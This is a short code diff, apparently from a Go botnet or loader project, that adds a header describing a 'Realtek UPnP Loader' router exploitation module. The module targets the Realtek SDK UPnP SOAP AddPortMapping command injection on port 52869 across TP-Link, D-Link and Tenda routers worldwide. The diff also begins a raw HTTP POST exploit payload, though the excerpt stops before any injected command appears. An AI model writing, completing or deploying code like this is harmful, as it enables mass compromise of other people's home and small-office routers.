@@ -13,6 +13,15 @@ import (
 	"time"
 )
 
+/* ============================================================================
+ * REALTEK UPNP LOADER - Router Exploitation Module
+ * ============================================================================
+ * Exploits Realtek SDK UPnP vulnerability (port 52869)
+ * Targets: SOHO routers with Realtek chips (TP-Link, D-Link, Tenda)
+ * Method: SOAP AddPortMapping command injection
+ * Global coverage: All regions with cheap router deployments
+ * ============================================================================ */
+
 // Realtek UPnP exploit payload
 const realtekPayload = `POST /picsdesc.xml HTTP/1.1
 Host: %s
